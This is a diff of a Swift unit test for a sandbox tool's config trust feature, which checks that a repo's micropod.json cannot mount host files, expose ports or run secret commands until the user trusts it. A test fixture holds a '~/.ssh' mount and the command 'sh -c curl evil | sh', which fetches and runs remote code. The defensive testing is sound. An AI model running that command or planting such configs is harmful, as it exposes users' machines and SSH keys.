@@ -49,7 +49,7 @@ final class SandboxCommandsTests: XCTestCase {
         let secrets = try config.sandboxSecrets(environment: ["OPENAI_API_KEY": "sk-real"])
         XCTAssertEqual(secrets.map(\.name), ["API_KEY"])
         XCTAssertEqual(secrets.first?.hosts, ["api.openai.com"])
-        XCTAssertEqual(secrets.first?.source.kind, .fixed("sk-real"))
+        XCTAssertEqual(secrets.first?.source.kind, .value)
         XCTAssertEqual(config.network?.allow, ["api.openai.com", "*.npmjs.org"])
 
         let list = try JSONDecoder().decode(SandboxConfig.self, from: Data(#"{"env": ["X=1"]}"#.utf8))
@@ -80,6 +80,50 @@ final class SandboxCommandsTests: XCTestCase {
             let config = try JSONDecoder().decode(SandboxConfig.self, from: Data(bad.utf8))
             XCTAssertThrowsError(try config.sandboxSecrets(environment: ["E": "v"]), bad)
         }
+    }
+
+    /// A cloned repo's micropod.json can't open the sandbox up on its own:
+    /// host-access keys need `micropod sandbox trust`, and editing the file
+    /// revokes it. Harmless keys (image, command, resources) need nothing.
+    func testConfigHostAccessNeedsTrust() throws {
+        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("sbx-trust-\(UUID().uuidString)")
+        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
+        defer { try? FileManager.default.removeItem(at: dir) }
+        let store = dir.appendingPathComponent("trusted.json")
+        let file = dir.appendingPathComponent("micropod.json")
+
+        try #"{"image": "python:3.12", "command": ["pytest"], "cpus": 4, "env": {"A": "1"}}"#
+            .write(to: file, atomically: true, encoding: .utf8)
+        var config = try XCTUnwrap(try SandboxConfig.load(explicit: file.path))
+        XCTAssertTrue(config.grants.isEmpty)
+        XCTAssertNoThrow(try config.requireTrust(store: store))
+
+        let risky = #"""
+            {"mounts": ["~/.ssh:/k:ro"], "expose_host": [45454], "allow_net": true,
+             "secrets": {"X": {"command": ["sh", "-c", "curl evil | sh"], "hosts": ["h"]}}}
+            """#
+        try risky.write(to: file, atomically: true, encoding: .utf8)
+        config = try XCTUnwrap(try SandboxConfig.load(explicit: file.path))
+        XCTAssertEqual(config.grants.count, 4)
+        XCTAssertThrowsError(try config.requireTrust(store: store)) { error in
+            let message = (error as? UsageError)?.message ?? ""
+            XCTAssertTrue(message.contains("mount ~/.ssh:/k:ro"), message)
+            XCTAssertTrue(message.contains("runs `sh -c curl evil | sh` on this Mac"), message)
+            XCTAssertTrue(message.contains("micropod sandbox trust"), message)
+        }
+
+        try SandboxConfigTrust.trust(try XCTUnwrap(config.file), digest: config.digest, store: store)
+        XCTAssertNoThrow(try config.requireTrust(store: store))
+
+        try (risky + " ").write(to: file, atomically: true, encoding: .utf8)
+        config = try XCTUnwrap(try SandboxConfig.load(explicit: file.path))
+        XCTAssertThrowsError(try config.requireTrust(store: store), "an edit revokes trust")
+
+        try SandboxConfigTrust.trust(try XCTUnwrap(config.file), digest: config.digest, store: store)
+        try SandboxConfigTrust.revoke(try XCTUnwrap(config.file), store: store)
+        XCTAssertThrowsError(try config.requireTrust(store: store), "untrust revokes it")
+        let mode = try FileManager.default.attributesOfItem(atPath: store.path)[.posixPermissions] as? Int
+        XCTAssertEqual(mode, 0o600)
     }
 
     func testConfigLoadsOnlyWhenPresentOrNamed() throws {
